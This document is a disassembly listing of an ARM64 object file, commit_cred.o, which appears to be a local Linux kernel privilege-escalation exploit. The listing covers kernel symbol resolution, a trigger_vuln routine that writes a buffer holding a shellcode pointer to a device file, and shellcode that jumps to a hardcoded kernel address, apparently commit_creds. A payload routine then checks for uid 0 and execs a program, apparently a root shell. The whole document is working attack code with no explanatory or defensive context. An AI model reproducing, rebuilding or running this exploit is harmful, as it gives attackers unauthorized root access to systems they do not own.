
commit_cred.o:     file format elf64-littleaarch64


Disassembly of section .text:

0000000000000000 <get_ksymbol>:
   0:	d108c3ff 	sub	sp, sp, #0x230
   4:	a9bf7bfd 	stp	x29, x30, [sp,#-16]!
   8:	910003fd 	mov	x29, sp
   c:	910063a1 	add	x1, x29, #0x18
  10:	f9000020 	str	x0, [x1]
  14:	90000000 	adrp	x0, 0 <get_ksymbol>
  18:	91000002 	add	x2, x0, #0x0
  1c:	90000000 	adrp	x0, 0 <get_ksymbol>
  20:	91000001 	add	x1, x0, #0x0
  24:	aa0203e0 	mov	x0, x2
  28:	94000000 	bl	0 <fopen>
  2c:	f9011fa0 	str	x0, [x29,#568]
  30:	1400000a 	b	58 <get_ksymbol+0x58>
  34:	9100c3a0 	add	x0, x29, #0x30
  38:	910063a1 	add	x1, x29, #0x18
  3c:	f9400021 	ldr	x1, [x1]
  40:	94000000 	bl	0 <strcmp>
  44:	6b1f001f 	cmp	w0, wzr
  48:	54000081 	b.ne	58 <get_ksymbol+0x58>
  4c:	9100a3a0 	add	x0, x29, #0x28
  50:	f9400000 	ldr	x0, [x0]
  54:	1400000b 	b	80 <get_ksymbol+0x80>
  58:	90000000 	adrp	x0, 0 <get_ksymbol>
  5c:	91000001 	add	x1, x0, #0x0
  60:	9100a3a2 	add	x2, x29, #0x28
  64:	9108dfa3 	add	x3, x29, #0x237
  68:	9100c3a4 	add	x4, x29, #0x30
  6c:	f9411fa0 	ldr	x0, [x29,#568]
  70:	94000000 	bl	0 <fscanf>
  74:	6b1f001f 	cmp	w0, wzr
  78:	54fffdec 	b.gt	34 <get_ksymbol+0x34>
  7c:	d2800000 	mov	x0, #0x0                   	// #0
  80:	a8c17bfd 	ldp	x29, x30, [sp],#16
  84:	9108c3ff 	add	sp, sp, #0x230
  88:	d65f03c0 	ret

000000000000008c <open_file>:
  8c:	a9be7bfd 	stp	x29, x30, [sp,#-32]!
  90:	910003fd 	mov	x29, sp
  94:	90000000 	adrp	x0, 0 <get_ksymbol>
  98:	91000000 	add	x0, x0, #0x0
  9c:	52800041 	mov	w1, #0x2                   	// #2
  a0:	94000000 	bl	0 <open>
  a4:	b9001fa0 	str	w0, [x29,#28]
  a8:	b9401fa0 	ldr	w0, [x29,#28]
  ac:	3100041f 	cmn	w0, #0x1
  b0:	540000a1 	b.ne	c4 <open_file+0x38>
  b4:	90000000 	adrp	x0, 0 <get_ksymbol>
  b8:	91000001 	add	x1, x0, #0x0
  bc:	52800020 	mov	w0, #0x1                   	// #1
  c0:	94000000 	bl	0 <err>
  c4:	b9401fa0 	ldr	w0, [x29,#28]
  c8:	a8c27bfd 	ldp	x29, x30, [sp],#32
  cc:	d65f03c0 	ret

00000000000000d0 <payload>:
  d0:	a9bf7bfd 	stp	x29, x30, [sp,#-16]!
  d4:	910003fd 	mov	x29, sp
  d8:	94000000 	bl	0 <getuid>
  dc:	6b1f001f 	cmp	w0, wzr
  e0:	54000201 	b.ne	120 <payload+0x50>
  e4:	90000000 	adrp	x0, 0 <get_ksymbol>
  e8:	91000000 	add	x0, x0, #0x0
  ec:	94000000 	bl	0 <puts>
  f0:	90000000 	adrp	x0, 0 <get_ksymbol>
  f4:	91000004 	add	x4, x0, #0x0
  f8:	90000000 	adrp	x0, 0 <get_ksymbol>
  fc:	91000001 	add	x1, x0, #0x0
 100:	90000000 	adrp	x0, 0 <get_ksymbol>
 104:	91000002 	add	x2, x0, #0x0
 108:	90000000 	adrp	x0, 0 <get_ksymbol>
 10c:	91000003 	add	x3, x0, #0x0
 110:	aa0403e0 	mov	x0, x4
 114:	d2800004 	mov	x4, #0x0                   	// #0
 118:	94000000 	bl	0 <execl>
 11c:	14000004 	b	12c <payload+0x5c>
 120:	90000000 	adrp	x0, 0 <get_ksymbol>
 124:	91000000 	add	x0, x0, #0x0
 128:	94000000 	bl	0 <warnx>
 12c:	52800000 	mov	w0, #0x0                   	// #0
 130:	94000000 	bl	0 <_exit>
 134:	d503201f 	nop
 138:	d503201f 	nop
 13c:	d503201f 	nop

0000000000000140 <shellcode>:
 140:	58000b83 	ldr	x3, 2b0 <main+0x58>
 144:	d2800000 	mov	x0, #0x0                   	// #0
 148:	d63f0060 	blr	x3

000000000000014c <print_data>:
 14c:	a9bf7bfd 	stp	x29, x30, [sp,#-16]!
 150:	910003fd 	mov	x29, sp
 154:	90000000 	adrp	x0, 0 <get_ksymbol>
 158:	91000000 	add	x0, x0, #0x0
 15c:	94000000 	bl	0 <puts>
 160:	a8c17bfd 	ldp	x29, x30, [sp],#16
 164:	d65f03c0 	ret

0000000000000168 <trigger_vuln>:
 168:	a9b87bfd 	stp	x29, x30, [sp,#-128]!
 16c:	910003fd 	mov	x29, sp
 170:	b9001fa0 	str	w0, [x29,#28]
 174:	b9001ba1 	str	w1, [x29,#24]
 178:	9100a3a0 	add	x0, x29, #0x28
 17c:	52801fe1 	mov	w1, #0xff                  	// #255
 180:	d2800802 	mov	x2, #0x40                  	// #64
 184:	94000000 	bl	0 <memset>
 188:	9100a3a0 	add	x0, x29, #0x28
 18c:	91012000 	add	x0, x0, #0x48
 190:	f9003fa0 	str	x0, [x29,#120]
 194:	f9403fa0 	ldr	x0, [x29,#120]
 198:	90000001 	adrp	x1, 140 <shellcode>
 19c:	f9400021 	ldr	x1, [x1]
 1a0:	f9000001 	str	x1, [x0]
 1a4:	9100a3a1 	add	x1, x29, #0x28
 1a8:	b9401fa0 	ldr	w0, [x29,#28]
 1ac:	d2800a02 	mov	x2, #0x50                  	// #80
 1b0:	94000000 	bl	0 <write>
 1b4:	a8c87bfd 	ldp	x29, x30, [sp],#128
 1b8:	d65f03c0 	ret

00000000000001bc <resolve_kernel_symbols>:
 1bc:	a9bf7bfd 	stp	x29, x30, [sp,#-16]!
 1c0:	910003fd 	mov	x29, sp
 1c4:	90000000 	adrp	x0, 0 <get_ksymbol>
 1c8:	91000000 	add	x0, x0, #0x0
 1cc:	94000000 	bl	0 <get_ksymbol>
 1d0:	aa0003e1 	mov	x1, x0
 1d4:	90000000 	adrp	x0, 8 <get_ksymbol+0x8>
 1d8:	f9400000 	ldr	x0, [x0]
 1dc:	f9000001 	str	x1, [x0]
 1e0:	90000000 	adrp	x0, 0 <get_ksymbol>
 1e4:	91000000 	add	x0, x0, #0x0
 1e8:	94000000 	bl	0 <get_ksymbol>
 1ec:	aa0003e1 	mov	x1, x0
 1f0:	90000000 	adrp	x0, 8 <get_ksymbol+0x8>
 1f4:	f9400000 	ldr	x0, [x0]
 1f8:	f9000001 	str	x1, [x0]
 1fc:	90000000 	adrp	x0, 0 <get_ksymbol>
 200:	91000000 	add	x0, x0, #0x0
 204:	94000000 	bl	0 <get_ksymbol>
 208:	aa0003e1 	mov	x1, x0
 20c:	90000000 	adrp	x0, 8 <get_ksymbol+0x8>
 210:	f9400000 	ldr	x0, [x0]
 214:	f9000001 	str	x1, [x0]
 218:	90000000 	adrp	x0, 8 <get_ksymbol+0x8>
 21c:	f9400000 	ldr	x0, [x0]
 220:	f9400000 	ldr	x0, [x0]
 224:	eb1f001f 	cmp	x0, xzr
 228:	540000c0 	b.eq	240 <resolve_kernel_symbols+0x84>
 22c:	90000000 	adrp	x0, 8 <get_ksymbol+0x8>
 230:	f9400000 	ldr	x0, [x0]
 234:	f9400000 	ldr	x0, [x0]
 238:	eb1f001f 	cmp	x0, xzr
 23c:	540000a1 	b.ne	250 <resolve_kernel_symbols+0x94>
 240:	90000000 	adrp	x0, 0 <get_ksymbol>
 244:	91000001 	add	x1, x0, #0x0
 248:	52800020 	mov	w0, #0x1                   	// #1
 24c:	94000000 	bl	0 <errx>
 250:	a8c17bfd 	ldp	x29, x30, [sp],#16
 254:	d65f03c0 	ret

0000000000000258 <main>:
 258:	a9be7bfd 	stp	x29, x30, [sp,#-32]!
 25c:	910003fd 	mov	x29, sp
 260:	90000000 	adrp	x0, 0 <get_ksymbol>
 264:	91000002 	add	x2, x0, #0x0
 268:	90000000 	adrp	x0, d0 <payload>
 26c:	f9400001 	ldr	x1, [x0]
 270:	aa0203e0 	mov	x0, x2
 274:	94000000 	bl	0 <printf>
 278:	94000000 	bl	8c <open_file>
 27c:	b9001fa0 	str	w0, [x29,#28]
 280:	b9401fa0 	ldr	w0, [x29,#28]
 284:	b9401ba1 	ldr	w1, [x29,#24]
 288:	94000000 	bl	168 <trigger_vuln>
 28c:	94000000 	bl	d0 <payload>
 290:	b9401fa0 	ldr	w0, [x29,#28]
 294:	94000000 	bl	0 <close>
 298:	90000000 	adrp	x0, 0 <get_ksymbol>
 29c:	91000000 	add	x0, x0, #0x0
 2a0:	94000000 	bl	0 <errx>
 2a4:	a8c27bfd 	ldp	x29, x30, [sp],#32
 2a8:	d65f03c0 	ret
 2ac:	00000000 	.word	0x00000000
 2b0:	0825d734 	.word	0x0825d734
 2b4:	ffffff80 	.word	0xffffff80
 2b8:	d503201f 	nop
 2bc:	d503201f 	nop
